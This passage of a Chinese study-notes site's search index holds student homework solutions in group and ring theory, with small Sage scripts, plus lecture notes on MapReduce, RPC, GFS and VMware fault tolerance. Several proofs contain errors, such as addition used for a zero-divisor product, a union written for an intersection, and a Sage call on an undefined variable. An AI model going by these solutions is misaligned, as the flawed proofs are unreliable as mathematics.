$$a \\cdot b \\in A \\or a \\cdot b \\in B$$，不失一般性，我们设 $$a \\cdot b \\in A$$\n因为 $$(A, \\cdot)$$ 也是群，所以 $$a^{-1} \\in A \\Rightarrow a^{-1} \\cdot (a \\cdot b) = b \\in A$$，这是与之前的假设是矛盾的。\n所以不可能存在群的集合，可以写成两个真子集的并。\n10 #  设群 $$(G, \\cdot)$$ 中的元素 a 具有阶 n，可以证明集合 $${e, a, a^2, \\cdots, a^{n-1}}$$ 与二元运算 $$\\cdot$$ 构成一个循环群，设为 C。\n很显然我们有 $$a^{-1} = a^{n-1}$$，现证明该元素的阶为 n：\n 首先显然有：$$(a^{n-1})^{n} = a^{-n} = e$$ 若 $$\\exist i \u0026lt; n, (a^{n-1})^{i}$$，则 $$(a^{n-1})^{i} =a^{n-i} = e$$，这与 C 构成循环群是矛盾的。所以 $$\\forall i \u0026lt; n, (a^{n-1})^i \\not= e$$  所以其逆元的阶也为 n。\n11 #  设群 $$(G, \\cdot)$$ 中的元素 a 具有阶 n，可以证明集合 $${e, a, a^2, \\cdots, a^{n-1}}$$ 与二元运算 $$\\cdot$$ 构成一个循环群，设为 C。\n根据拉格郎日定理，$$|G| \\equiv 0 \\pmod{|C|}$$，即 a 的阶 n 可以整除 G 的元素个数。\n12 #  很显然 0 不是 $$(\\mathbb{Z}_p, +)$$ 的生成元，因此只需证明 $$\\forall b \\in \\mathbb{Z} \\text{\\} {0}$$，b 都是生成元即可。\n对于 $$(\\mathbb{Z}_p, +)$$，我们知道一个显然的生成元 a=1，对于 b，显然有 $$b = a^b$$，\n因为 p 是素数，我们有 $$\\exist s,t, sp + tb = 1$$，考虑 $$a = a^{sp + tb} = (a^{p})^{s}a^{bt} = a^{bt} = b^t$$\n这表明任意 a 可以通过二元运算生成的元素，b 亦可生成，而 a 是生成元，则 b 一定是生成元。\n13 #  设群 G 的幺元为 e。有 $$xa = ax \\Leftrightarrow a = x^{-1}ax$$\n我们考虑等式右边元素的阶：\n 若 $$a = e$$，则等式恒成立 若 $$a \\not= e$$，考虑 $$(x^{-1}ax)^2 = x^{-1}a^2x = e$$，右边元素的阶为 2，所以必然属于唯一的二阶循环群，显然它并不等于幺元，所以 $$x^{-1} a x = a$$  14 #  $$(\\text{G 只有有限个子群} \\Rightarrow \\text{G 是有限群}) \\Leftrightarrow (无限群总有无限个子群)$$\n考虑无限群中的元素：\n 如果所有元素的阶均为有限阶，那么一定存在无限个子群，这个是很容易证明的； 如果存在无限阶元素，那么必然存在一个无限阶循环群，而无限阶循环群必然与 $$(\\mathbb{Z}, +)$$ 同构，而后者有无限子群，所以原无限群必然有无限子群。  所以无限群总有无限个子群，因此原命题得证。\n15 #  （1）\n设循环群 H, K 的生成元分别为 h, k，则必然会有：$$h^r = e, k^s = e$$。\n考虑元素 hk：\n $$(hk)^{rs} = h^{rs} k^{rs} = e$$ $$\\forall i \u0026lt; rs, gcd(r, s) = 1 \\Rightarrow lcm(r,s) = rs \\Rightarrow i \\text{ 不同时整除 }r,s$$  如果 i 仅整除其中 r, s 之一，必然有：$$(hk)^i \\not= e$$ 如果二者都不整除，有 $$(hk)^i = h^a k^b, 0\u0026lt;a\u0026lt;r, 0 \u0026lt; b \u0026lt; s$$，我们考虑到 $$h^a$$ 的逆元必然在循环群群 H 中，因此必然有 $$(hk)^i \\not= e$$    所以元素 hk 的阶为 rs，因此该元素可以生成一个阶为 rs 的循环子群。\n（2）\n跟第一问的证法一样。\n16 #  对于质数阶的群考虑拉格朗日定理，如果有子群 H，则其阶必然被质数整除，那么这个子群的阶必然为 1 或这个质数本身，则该群必然是非平凡子群。\n17 #  首先显然有 $$G_1 \\sub G_1 G_2, G_2 \\sub G_1 G_2$$\n考虑到 $$G_1 \\cap G_2$$ 中是含幺元、满足结合律的，然后：\n $$G_1 \\cap G_2$$ 中任取两元素一定同时属于两个群，其二元运算的结果也一定属于两个群，因此满足封闭性 $$G_1 \\cap G_2 $$ 中任意元素的逆元必定同时存在两个群中，因此它也是满足存在逆元的。  因此 $$G_1 \\cap G_2$$ 构成一个群。\n显然 $$G_1G_2$$ 构成一个群，考虑 $$G_1 G_2$$ 的子群 $$G_2$$ 所确定的左陪集关系对 $$G_1 G_2$$ 进行划分，于是我们有：\n $$|G_1 G_2| = [G_1G_2:1] = [G_1G_2: G_2][G_2:1]$$  考虑商集：$$[G_1G_2:G_2] = card({g_1g_2G_2 | g_1 \\in G_1, g_2 \\in G_2}) = card({g_1G_2 | g_1 \\in G_1})$$\n因为我们有 $$G_1 \\cap G_2 \\sub G_2$$，所以若 $$g_i G_2, g_j G_2$$ 不相交，那么 $$g_i (G_1 \\cap G_2), g_j (G_1 \\cap G_2)$$ 必然互不相交，所以：$$card({g_1G_2 | g_1 \\in G_1}) = card({g_1(G_1 \\cap G_2) | g_1 \\in G_1}) = [G_1:G_1 \\cap G_2]$$，即：\n $$[G_1G_2:G_2] = [G_1 : G_1 \\cap G_2]$$  考虑这个指标的计算：\n $$\\displaystyle |G_1 : G_1 \\cap G_2| = \\frac{[G_1:1]}{[G_1 \\cap G_2 : 1]}$$  综上我们有：$$\\displaystyle |G_1G_2| = \\frac{|G_2:1||G_1:1|}{|G_1 \\cap G_2:1|}$$\n18 #  考虑 G 的阶的计算：$$|G| = [G:1] = [G:G_2][G_2:1] = [G:G_1][G_1:1]$$\n对于 $$G_1 \\sub G_2$$ 我们又有：$$[G_2:1] = [G_2:G_1][G_1:1]$$\n于是结合上式：$$[G:G_2] = [G:G_1][G_1:G_2]$$\n19 #  充分性：\n  若商群 $$(G/H, \\cdot)$$ 是阿贝尔群，$$\\forall g, k \\in G, gH \\cdot kH = kH \\cdot gH \\Rightarrow (g \\cdot k)H = (k \\cdot g) H$$，令 $$H' = (g \\cdot k)H = (k \\cdot g)H$$\n  则对于 $$\\displaystyle \\forall x \\in H', \\exist a, b \\in H \\overset{s.t.}{\\Rightarrow} (g \\cdot k) \\cdot a = (k \\cdot g) \\cdot b \\Rightarrow g^{-1} \\cdot k^{-1} \\cdot g \\cdot k = b \\cdot a^{-1} \\in H$$\n  因为 $$\\forall g,k \\in G \\Rightarrow g^{-1},k^{-1} \\in G$$，因此必然有 $$g \\cdot k \\cdot g^{-1} \\cdot k^{-1} \\in H$$\n  必要性：\n  设 $$\\equiv$$ 是由 H 确定的在 G 上的左陪集关系。因为 $$g \\cdot k \\cdot g^{-1} \\cdot k^{-1} \\in H$$，所以有 $$k^{-1} \\cdot g^{-1} \\equiv g^{-1} \\cdot k^{-1} \\Rightarrow (k^{-1} \\cdot g^{-1})H = (g^{-1} \\cdot k^{-1})H$$\n  同样的，$$\\forall g,k \\in G \\Rightarrow g^{-1},k^{-1} \\in G$$，因此 $$\\forall g, k \\in G \\Rightarrow (g \\cdot k) H = (k \\cdot g)H$$，因此商群是阿贝尔群。\n  20 #  我们考虑 $$h^{-1}k^{-1}hk$$：\n 因为 H 是正规子群，那么必然会有 $$k^{-1}hk \\in H$$，因此 $$h^{-1}(k^{-1}hk) \\in H$$ 因为 K 是正规子群，那么必然会有 $$h^{-1}k^{-1}h \\in H$$，因此 $$(h^{-1}k^{-1}h)k \\in K$$  于是，$$h^{-1}k^{-1}hk \\in H \\cup K = {1} \\Rightarrow h^{-1}k^{-1}hk = 1 \\Rightarrow hk = kh$$\n21 #  扭元构成的集合：\n  封闭性：对于 $$\\forall g_1, g_2 \\in G_{tor}, g_1^{n_1}, g_2^{n_2} = e$$：$$\\exist n = n_1 n_2, (g_1g_2)^{n} = (g_1^{n_1})^{n_2} (g_2^{n_2})^{n_1} = e \\Rightarrow g_1g_2 \\in G_{tor}$$\n  结合律：因为二元运算在 G 上是结合的，所以在其子集中是必然是结合的\n  存在幺元：很显然\n  存在逆元：对于 $$\\forall g \\in G_{tor}, g^n = e \\Rightarrow g^{-1} = g^{n-1} \\Rightarrow g^{-1} \\in G_{tor}$$\n  所以这个扭元构成的集合是一个群，又因为 G 是一个交换群，所以扭元构成的集合必然是 G 的一个正规子群。\n22 #  设由 H 确定的 G 上的左陪集关系构成的商集是 $${H, aH}$$\n对于 $$\\forall h \\in H, g \\in G$$：\n 若 $$g \\in H$$，因为 H 是一个群，因此必然有 $$g h g^{-1} \\in H$$ 若 $$g \\in aH, \\exist h' \\in H, g = ah'$$，我们用反证法：  若 H 不是 G 的正规子群，那么必然有 $$ghg^{-1} \\in aH \\Rightarrow \\exist h'' \\in H, ghg^{-1} = ah''$$，从而我们有： $$ah' h (h')^{-1}a^{-1} = ah'' \\Rightarrow a = h\u0026rsquo;h(h')^{-1}(h'')^{-1} \\in H$$，这很显然是错误的，所以 H 是 G 的正规子群    23 #  （1）\n对于 $$H \\times K$$ 上定义的乘法运算：\n  封闭性：对于 $$(h_1, k_1), (h_2, k_2) \\in H \\times K$$，因为 H, K 是群，必然有 $$h_1 h_2 \\in H, k_1k_2 \\in K \\Rightarrow (h_1h_2, k_1k_2) = (h_1, k_1)(h_2,k_2) \\in H \\times K$$\n  结合性：同样的，因为 H, K 是群，我们可以得到这个二元运算在 $$H \\times K$$ 是结合的；\n  幺元：设 H, K 的幺元为 $$e_1, e_2$$，因此对于 $$H \\times K$$，有幺元 $$(e_1, e_2)$$，证明是显然的；\n  逆元：同样的，对于 $$(h, k) \\in H \\times K$$，有逆元 $$(h^{-1}, k^{-1})$$\n  所以代数系统 $$(H \\times K, \\cdot)$$ 构成一个群。\n（2）\n对于 $$H_1 = {(h, e_1) | h \\in H}$$：\n 首先这很显然是一个子群，下面证明它是正规子群； $$\\forall (h, e_1) \\in H_1, (h', k') \\in H \\times K \\Rightarrow (h', k')^{-1}(h, e_1)(h', k') = ((h')^{-1}hh', e_1) \\in H_1$$  因此 $$H_1$$ 是一个正规子群。同理可以证明 $$K_1$$ 也是一个正规子群。\n（3）\n很显然这个是正确的：$$H_1 \\cap K_1 = {(e_1, e_2)}$$\n关于 $$H \\times K = H_1K_1$$：\n 首先对于 $$\\forall (h, k) \\in H \\times K, (h,k) = (e_1, k)(h, e_2)$$，所以 $$H \\times K \\sub H_1K_1$$ 其次我们有 $$\\forall (e_1, k) \\in K_1, (h, e_2) \\in H_1, (h,k) \\in H \\times K$$，所以 $$H_1K_2 \\sub H \\times K$$  结合上两式我们会有：$$H \\times K = H_1K_1$$\n24 #  （1）\n不是：取 $$1.6, 1.6 \\in \\R$$，$$f(1.6 + 1.6) = f(3.2) = 3, f(1.6) + f(1.6) = 2 \\Rightarrow 2, 3 \\in \\Z \\and 2 \\not= 3$$\n（2）\n是。显然：$$|x| \\cdot |y| = |x \\cdot y|$$。下面求核：\n$$ker\\ f = {a | a \\in \\R^* \\and f(a) = e_{\\R^+}} = {a | a \\in \\R^* \\and |a| = 1} = {1, -1}$$\n（3）\n不是。取 $$3, 3 \\in \\Z_5, f(3 +{mod5} 3) = 1,f(3) +{mod2} f(3) = 0 \\Rightarrow 1 \\not= 0$$\n25 #  对于自同构集合 AutG，有 $$\\forall f_1, f_2 \\in AutG$$，二者都是 G 上的双射。我们考虑函数的复合 $$\\circ$$：\n 封闭性：因为 $$f_1, f_2$$ 是双射，$$f_1 \\circ f_2$$ 必然也是双射，$$f_1, f_2$$ 的定义域值域均相等，必然也是 $$f_1 \\circ f_2$$ 的定义域值域，因此 $$f_1 \\circ f_2$$ 也是 AutG 的自同构； 结合性：函数的复合满足结合律； 存在幺元：存在 $$e = x \\rightarrow x$$，为这个代数系统的幺元； 存在逆元：f(x) 存在逆元 $$f^{-1}(x)$$  因此 $$(AutG, \\circ)$$ 是一个群。\n26 #  （1）\n$$g \\rightarrow g^{-1} \\text{是 G 的自同构} \\Leftrightarrow f(g_1 g_2) = f(g_1)f(g_2) \\Leftrightarrow g_2^{-1} g_1^{-1} = g_1^{-1}g_2^{-1} \\Leftrightarrow \\text{G 是阿贝尔群}$$\n（2）\n考虑 $$\\displaystyle f(g_1 g_2) = (g_1g_2)^k \\overset{\\text{G 是阿贝尔群}}{=} g_1^k g_2^k = f(g_1)f(g_2)$$\n因此 f 是 G 的自同态。\n27 #  先做以下的函数：$$f(x) = \\begin{cases}1 \u0026amp; x =a \\ 2 \u0026amp; x = b \\ 3 \u0026amp; x = c \\end{cases}$$，\n考虑映射 $$g: ([e, x_1, x_2, x_3] \\rightarrow [e, y_1, y_2, y_3]) \\rightarrow \\begin{pmatrix} f(x_1) \u0026amp; f(x_2) \u0026amp; f(x_3) \\ f(y_1) \u0026amp; f(y_2) \u0026amp; f(y_3) \\end{pmatrix}$$\ng 是一个从四元群 K 的自同构群映射到 $$S_3$$ 的双射，因此二者同构。\n28 #  直接分解：\n$$\\displaystyle \\begin{pmatrix}1 \u0026amp; 2 \u0026amp; 3 \u0026amp; 4 \u0026amp; 5 \u0026amp; 6 \u0026amp; 7 \u0026amp; 8 \\ 2 \u0026amp; 5 \u0026amp; 6 \u0026amp; 8 \u0026amp; 1 \u0026amp; 4 \u0026amp; 7 \u0026amp; 3 \\end{pmatrix} = (2\\ 5\\ 1)(1\\ 2\\ 6\\ 8\\ 5\\ 4\\ 7\\ 3) = (2\\ 5\\ 1)(6\\ 4\\ 8\\ 3)(1\\ 2\\ 3\\ 4\\ 5\\ 6\\ 7\\ 8) = (2\\ 5\\ 1)(6\\ 4\\ 8\\ 3)(7)$$\n或者用 sage：\n#!/usr/bin/env sage p = Permutation([2,5,6,8,1,4,7,3,])\t# 建立题目中给的置换 (permutation) p.to_cycles()\t# 将这个置换转化为轮换 (cycle) # [(1, 2, 5), (3, 6, 4, 8), (7,)] 29 #  #!/usr/bin/env sage p1 = Permutation([2, 5, 6, 8, 1, 4, 7, 3]) p2 = Permutation([2, 5, 6, 4, 1, 8, 7, 3])\t# 建立题目中给的两个置换 (permutation) p = p1*p2\t# 复合这两个置换 (multiplication) print(p) # [5, 1, 8, 3, 2, 4, 7, 6] p.to_cycles()\t# 将复合的置换转化为轮换 (cycle) # [(1, 5, 2), (3, 8, 6, 4), (7,)] 即 $$(1\\ 5\\ 2) \\circ (3\\ 8\\ 6\\ 4) \\circ (7)$$\n30 #  #!/usr/bin/env sage sigma = Permutation([2, 3, 1, 5, 4]) tau = Permutation([3, 4, 1, 5, 2]) print(sigma * tau)\t# [4, 1, 3, 2, 5] print(sigma.inverse() * tau * sigma)\t# [2, 1, 5, 3, 4] print(sigma * sigma)\t# [2, 1, 5, 3, 4] print(sigma * sigma * sigma)\t# [1, 2, 3, 5, 4] "},{"id":102,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/homework/4.2/","title":"4.2","section":"HOMEWORK","content":"4.2 交换环与域 #  证明题 #  1 #  对于加法运算：在 4.1 的第 3 题中已经证明 $$(\\Z \\times \\Z, +)$$ 是一个群，交换律也显然可以证明；\n对于乘法运算：因为 $$(\\Z, \\cdot)$$ 构成一个交换群，显然是满足结合率、存在幺元和交换率的。\n存在零因子 $$(a, 0), (0,b) \\Rightarrow (a, 0) + (b, 0) = (0, 0)$$\n综上所述，$$(\\Z \\times \\Z, +)$$ 是一个有零因子的交换环。\n2 #  对于高斯整环 $$\\Z[i] = {a + b i | a, b \\in \\Z}$$ 上的任意元素 $$a + bi$$，如果它存在逆元：\n即求 $$(a + bi) (c + di) = 1$$ 关于 c,d 的解。\n$$\\displaystyle ac - bd + (ad + bc)i = 1 \\Rightarrow \\begin{cases} ac - bd = 1 \\ ad + bc = 0 \\end{cases}\\Rightarrow a^2 c + b^2c = a \\Rightarrow (a^2 + b^2)c = a$$\n分情况讨论：\n 若 a \u0026gt; 1 或 a \u0026lt; -1，因为 $$a \\in \\Z$$，必然有 $$a^2 + b^2 \u0026gt; |a|$$，所以 $$(a^2 + b^2) c = a$$ 不可能成立； 若 $$a = \\pm 1 \\Rightarrow b = 0, c = \\pm 1$$，则此时 $$a + bi = \\pm 1$$ 若 $$a = 0 \\Rightarrow c = 0 \\Rightarrow bd = -1 \\Rightarrow b = \\pm 1$$，则此时 $$a + bi = \\pm i$$  3 #  同前一题，即求 $$(a + b \\sqrt{2} )(c + d \\sqrt{2}) = 1$$ 的解。\n$$\\displaystyle ac + 2bd + (ad + bc) \\sqrt{2} = 1 \\Rightarrow \\begin{cases} ac + 2bd = 1 \\ ad+bc = 0 \\end{cases} \\Rightarrow a^2c + 2 b^2 c = a \\Rightarrow (a^2 +2b^2)c = a$$\n同样分情况讨论，可以得到 $$a = \\pm1, 0$$，而当 a = 0 时，是无解的，因此 $$a + b i = \\pm1$$ 时可逆。\n4 #  使用 sagemath 对几个数进行素元素分解：\n#!/usr/bin/env sage ZZI.\u0026lt;I\u0026gt; = GaussianIntegers() print(ZZI) # Gaussian Integers in Number Field in I with defining polynomial x^2 + 1 print( factor(ZZI(2)), factor(ZZI(3)), factor(ZZI(5)), factor(ZZI(y)) ) # ((-I) * (I + 1)^2, 3, (I) * (-I - 2) * (2*I + 1), 7) 也就是说：$$2 = -i \\cdot(i + 1)^2, 3 = 3, 5 = i \\cdot (-i -2) \\cdot(2 \\cdot i + 1), 7 = 7$$\n5 #  充分性：\n 当 $$\\Z_m$$ 为整环时，若 m 不是素数，必然有这样的两个元素 $$\\exist a, b \\not= 1 \\Rightarrow m = a \\cdot b$$ 那么考虑在 $$\\Z_m$$ 中，有：$$\\exist a \\Rightarrow \\exist b, s.t. a \\cdot b \\equiv 0 \\pmod{m}$$，a 是零元，那么 $$\\Z_m$$ 不是整环，这是矛盾的。  必要性：\n 当 m 是素数，$$\\Z_m$$ 不为整环时，即存在这样的元素 $$\\exist a \\Rightarrow \\exist b, a \\cdot b \\equiv 0 \\pmod{m}$$ 如果 a,b 均不为幺元，那么必有 $$a \\cdot b = k \\cdot m$$，而 m 是素数，则有 $$m | a$$ 或 $$m | b$$，那么在 $$\\Z_m$$ 内，则可以得到 $$a = 0 \\or b = 0$$，这是条件是矛盾的  6 #  对于 $$\\Q(\\sqrt{2})$$ 中的元素，可以表示成为 $$\\displaystyle \\frac{t}{s} + \\frac{q}{p}\\sqrt{2}$$，我们在后面用 m,n 表示有理数。\n因为 $$(\\Q, +)$$ 构成一个交换群，我们容易证明 $$(\\Q(\\sqrt{2}), +)$$ 也构成一个交换群。\n另外我们考虑 $$(\\Q(\\sqrt{2}), \\cdot)$$ 代数系统：封闭性、结合率、零元、交换率都是满足的。\n我们考虑加法对乘法的分配率：\n $$\\displaystyle (m_1 + n_1 \\sqrt{2}) \\cdot (m_2 + n_2 \\sqrt{2} + m_3 + n_3 \\sqrt{2}) = (m_1m_2 + m_1m_3 + 2n_1n_2 + 2n_1n_3) + (n_1m_2 + n_1m_3 + m_1n_2 + m_1 n_3) \\sqrt{2}$$ $$(m_1 + n_1 \\sqrt{2})(m_2 + n_2 \\sqrt{2}) + (m_1 + n_1\\sqrt{2})(m_3 + n_3\\sqrt{2}) = (m_1m_2 + m_1m_3 + 2n_1n_2 + 2n_1n_3) + (n_1m_2 + n_1m_3 + m_1n_2 + m_1 n_3) \\sqrt{2}$$  所以加法对乘法满足分配率。$$\\Q(\\sqrt{2})$$ 是一个交换环。\n我们考虑是否存在零因子：\n 若存在：$$(m_1 + n_1 \\sqrt{2})(m_2 + n_2 \\sqrt{2}) = 0 \\Rightarrow m_1m_2 + 2n_1n_2 + (m_1 n_2 + m_2 n_1) \\sqrt{2} = 0$$ 则我们得到方程组 $$\\begin{cases} m_1m_2 + 2n_1n_2 = 0 \\ m_1n_2 + m_2n_1 = 0\\end{cases} \\Rightarrow -2 n_1n_2^2 + m_2^2n_1 = 0$$ 分析之后 $$n_1 = 0 \\or 2n_2^2 = m_2^2$$，因为这四个数都是有理数，所以 $$\\displaystyle \\frac{m_2}{n_2}$$ 必然也是有理数，而有理数的平方不会等于 2，因此后者是不成立的，我们推出 $$n_1 = 0$$。 回到之前的推论，有 $$m_1m_2 = 0 \\and m_1n_2 = 0 \\Rightarrow m_1 = 0 \\or (m_2 = n_2 = 0)$$，因此最初的 $$\\Q(\\sqrt{2})$$ 中必然有一个零元，而这是与假设矛盾的。因此原交换环中不存在零因子，是一个整环。  同样的我们考虑逆元：\n 因为幺元是 1，我们同上面的分析方法类比分析得到方程组：$$\\begin{cases} m_1m_2 + 2n_1n_2 = 1 \\ m_1n_2 + m_2n_1 = 0 \\end{cases}$$ 对于给定的 $$m_1, n_1$$，只需要证明上述方程对于 $$m_2, n_2$$ 有解即可，很显然这是一个关于 $$m_2, n_2$$ 的线性方程组 考虑系数矩阵：$$\\begin{pmatrix} m_1 \u0026amp; 2n_1 \\ n_1 \u0026amp; m_1 \\end{pmatrix}$$，因为二者都为有理数，因此这个矩阵的行列式不为零，原方程组必有唯一解  因此原整环也是一个域。\n7 #  对于 $$\\forall f(x)= a_n x^n + a_{n-1} x^{n-1} + \\cdots + a_1 x + a_0, g(x)= b_m x^m + b_{m-1} x^{m-1} + \\cdots + b_0$$\n有 $$f(x)g(x) = a_n b_m x^{n+m} + \\cdots + a_0b_0$$\n因为 $$a_n, b_m \\in R$$，R 是一个交换整环，R 中无零因子，而 $$a_n, b_m$$ 必然非零元，因此 $$a_nb_m \\not= 0$$\n所以 $$\\deg fg = deg f + \\deg g$$\n8 #  证明集合 $$I = {a | a \\in R, \\exist m \\in N \\Rightarrow a^m = 0}$$ 是 R 的理想：\n 对于 0，显然是属于 I 的； 对于 $$\\forall a, b \\in I, \\exist m,n \\Rightarrow a^m = b^n = 0$$，我们考虑 $$(a+b)^{m+n}$$，考虑其分解的单项式的形式必然满足 $$a^s b^t, s \\ge m \\or t \\ge n$$，因此有 $$(a+b)^{m+n} = 0 $$，则 $$a + b \\in I$$ 对于 $$\\forall a \\in I \\Rightarrow \\exist m, a^m = 0; \\forall r \\in R$$，考虑 ar，显然有 $$(ar)^m = 0$$。  综合以上的论述，I 是 R 的理想。\n9 #  因为 R 是交换整环而不是域，因此 R 上必然存在一个不可逆元素，我们设之为 a。\n如果 R[x] 是主理想整环，必然有 R[x] 上不存在零因子，且 R[x] 上的所有理想都是主理想。\n考虑子集 $$H = {a, x^2 + 1}$$ 生成的理想 $$I = \u0026lt;a, x^2 + 1\u0026gt;$$。我们知道 R 是一个整环，因此后者的多项式一定是不可约的，因此 $$x^2 + 1$$ 仅有平凡因子。而由于 I 是一个主理想，必然存在一个生成元，考虑 H 中有素多项式，因此这个生成元必然是幺元 1。\n而因为 a 是不可逆的，那么幺元 1 必然不在 H 生成的理想中。这是矛盾的，因此 R[x] 不是主理想整环。\n10 #  （1）\n$$\\pi: R \\rightarrow R/I$$\n11 #  考虑构造商环的商群，考虑商群中的一个元素商集 $${a +  | a \\in \\Z[x]}$$。\n考虑 a，设 $$a = m_x + k, m_x \\in , k \\in \\Z$$，则商集 $${m_x + k +  | m_x \\in , k \\in \\Z}$$ = $${k +  | k \\in \\Z}$$\n很显然这个商群与 $$\\Z$$ 存在一一对应关系，因此二者同构。\n12 #  即证理想的交是仍理想，我们设 R 有这样两个理想 $$I_1, I_2$$，考虑他们的交 $$I_0 = I_1 \\cap I_2$$\n 显然 0 属于这个交集； 然后考虑集合运算的封闭性。因为二者都是理想对于 $$a, b \\in I_0$$，在两个理想中分别考虑性质可以得到 $$a + b \\in I_1, a+b \\in I_2 \\Rightarrow a+b \\in I_0$$；  15 #  （1）\n设 R 中包含 K 的子环的集合为 $$\\Sigma$$，R' 中子环集合为 $$\\Sigma'$$\n对 $$\\forall R_1 \\in \\Sigma \\Rightarrow f(R_1) \\in \\Sigma'$$，所以 f 是 $$\\Sigma \\rightarrow \\Sigma'$$ 的映射\n然后我们考虑 $$\\forall R_1' \\in \\Sigma'$$，考虑 $$R_1'$$ 在 f 下原像的集合 $$f^{-1}$$ 是 $$\\Sigma' \\rightarrow \\Sigma$$ 的映射。\n设 $$R_1 \\in \\Sigma, R_1 \\sub f^{-1}(f(R_1))$$，若有 $$\\forall u \\in f^{-1}(f(R_1)), \\exist v \\in R_1, s.t. f(v)=f(u) \\Rightarrow f(v - u) = 0, u -v \\in K \\in R_1 \\Rightarrow u \\in R_1$$\n因此 $$R_1 = f^{-1}(f(R_1))$$\n（2）\n"},{"id":103,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/1.introduction/","title":"1. Introduction","section":"分布式系统","content":"Introduction #  分布式系统的优点：\n Parallelism：通过并行提高计算量、数据处理量； Fault Tolerate：通过多个服务器提升容错率； Physically：聚合物理意义上相互隔离的机器； Security：系统可以分布式地运行在地理位置相聚很远的地方，提升容灾性；  分布式系统的缺点与困难：\n Concurrent Parts：需要同时并行地处理多个部分； Complex Interactions：需要处理复杂的服务交互逻辑（微服务中通过“服务发现”实现分布式系统）； Partial Failure：无法同时达到绝对准确性与服务可用性； Performance：需要设计精巧的算法以实现更高的性能；  MapReduce 是“分布式系统”的开山论文，它最初被 Google 研发出来，用于解决大容量的网页问题：http://nil.csail.mit.edu/6.824/2020/papers/mapreduce.pdf\n"},{"id":104,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/2.infra-rpc/","title":"2. Infra Rpc","section":"分布式系统","content":"Infrastrcture: RPC and threads #  为什么要选择 Go 语言？\n 通过 go 与 goroutine 对并发有很好的支持； 简易的 RPC 框架； 类型安全（相对于 js、python 这类的脚本语言）； 自动垃圾回收（没有 UAF 漏洞）； 相对简单的语法（工业界需要一个像 python 一样简单语法的编译型语言）；  多线程的挑战：\n Share Data：Golang 中使用 sync.Mutex，尽量避免共享可变量； Coordination：Glang 使用 channel、sync.Cond、WaitGroup； Deallock：线程间的循环等待；  lock/channel 应该在什么时候？\n 一个结论是：大部分的多线程问题可以通过上面两个工具解决； 什么时候使用哪个工具取决于程序员的思考，一个建议是：  state 状态共享时：使用 lock； communication 线程间信息交流时：使用 channel；    RPC：Remote Procedure Call；\n Client \u0026ldquo;best effort\u0026rdquo;：当服务端无响应时，多进行几次尝试后抛出异常； Server \u0026ldquo;at most once\u0026rdquo;：客户端对每次请求添加 xid 唯一表示，服务端通过 xid 去重；  "},{"id":105,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/3.gfs/","title":"3. Gfs","section":"分布式系统","content":"Google File System (Distribute Storage) #  分布式存储的困难点：\n 高性能：High performance in many server; 多机器：System with many machine could cause \u0026ldquo;constant fault\u0026rdquo;; 一致性错误：To avoid contact fault, we will need replication; 数据同步：During the replication, potential inconsistencies will occur; 一致性与高性能矛盾：To get better consistency, low performance occur;  分布式存储的一个大的课题就是在“一致性”与“高性能”之间的 tradeoff.\nGFS Master：\n RAM 中存储：  一个 filename 到 handlers array 的映射表； 每个 handler 都包含 version/chunk servers list/primary/least time 信息；   磁盘中存储着 log/checkpoint；  READ，客户端读取流程：\n C send filename and offset to the master M; M finds chunk handle for that offset; M replies list of chunkservers(aka CS) only with lastest versions; C caches this response; C sends request to nearest CS with offset; CS read the chuck file from disk and returns;  APPEND，客户端追加流程：\n  C ask M about filename\u0026rsquo;s last chunk;\n  If M see filename has no primary hanlder:\n Pick a primary(aka P) and secondaries(aka S) with latest version (Only these server was allowed to handle storing filename); Increment lastest version; Tell P/S who they are;    M response C with primary, secondaries and version;\n  C sends append data to all:\n The paper change thier tone after, C only sends data to the nearest replica and chain the data to all replicas which can reduce trans cost;    C tells primary P to execute append;\n  P checks that lease hasn\u0026rsquo;t expired, and chunk has space. And then P picks an offset (at end of chunk), writes chunk file (a Linux file) at the offset;\n  P tells each secondary the offset, tells to exexute append to chunk file\n  P waits for all secondaries to reply, or timeout;\n  P tells C \u0026ldquo;ok\u0026rdquo; or \u0026ldquo;error\u0026rdquo;. C retries from start if error\n  Split Brain 问题：\n 描述：一个 filename 同时对应了多个 primary 处理； 原因：通常是因为 network partition 导致的（部分机器之间无法通信）； 解决方案：在指派 primary 时同时指派一个 lease 表示过期时间，master 与 primary 同时维护这个过期时间，过期后 master 重新指派 primary；  总结：GFS 优点：\n Global cluster file system as universal infrastructure; Seperation of naming system (master) and storage system (chunk servers) Sharding file into chunk for parallel throughput; Huge files/chunks to reduce overheads; Designation primary to achieve sequential writes; Lease to prevent split-brain chunk servers primaries;  GFS 缺点：\n Single master performance: ran out of RAM and CPU Chunkservers not very efficient for small files Lack of automatic fail-over to master replica; Maybe consistency was too relaxed  "},{"id":106,"href":"/docs/%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F/4.vm-ft/","title":"4. Vm Ft","section":"分布式系统","content":"VMware FT(Fault-Tolerant) #  Primary/Backup Replication #  Two main replication approaches:\n State Transfer: Primary replica executes and sends new state to backups machine; Replicated State Machine: Primary just pass the raw external event to backups. Mostly used by recent industry and papers;  Overview:\n VM-FT consist of two machine: primary and backup. Primary deals with all external events and replicates it to backup through \u0026ldquo;logging channel\u0026rdquo;; VM-FT emulates a local disk interface through two remote disk server.  Log Entry #  events can\u0026rsquo;t determine all situation, FT must handle the following divergence:\n 指令本身的差异：Most instructions execute identically; 机器所处外部的信号差异：Input from external world: network packet, DMA data, OS interrupt, etc; 并不是所有指令都是状态指令（唯一输入唯一输出的纯函数）。比如：读取当前时间、随机数发生器（某种意义上说与前者是一类）； 并发与多核：Parallelism and multi-core races;  为了使得 pirmary 和 backup 的状态完全一样，我们就必须要处理上面列举的一些异常情况，在它们通信时将这些信息传递出去使得它们执行的代码完全一样。\nSo the log entry who transfers message between Primary and Backup should contain these 